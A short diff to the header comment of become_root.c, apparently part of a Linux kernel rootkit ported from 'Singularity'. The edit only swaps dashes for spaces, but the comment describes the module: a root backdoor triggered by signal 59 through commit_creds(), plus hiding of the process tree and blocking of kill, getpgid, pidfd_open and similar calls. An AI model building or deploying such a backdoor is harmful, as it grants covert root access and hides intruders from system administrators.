@@ -1,4 +1,4 @@
-/* become_root.c — Privilege escalation via signal 59 + PID hiding.
+/* become_root.c   Privilege escalation via signal 59 + PID hiding.
  *
  * Signal 59 (unused by POSIX) triggers uid=0 commit_creds() for the
  * sending process. Secondary effect: hides the process tree and blocks
@@ -8,7 +8,7 @@
  *   kill, getpgid, getpgrp, getsid, sched_getaffinity, sched_getparam,
  *   sched_getscheduler, sched_rr_get_interval, sysinfo, pidfd_open
  *
- * Port from Singularity — ARCH_SYS() + REGS_ARGn for portability.
+ * Port from Singularity   ARCH_SYS() + REGS_ARGn for portability.
  */
 #include "../include/core.h"
 #include "../include/become_root.h"
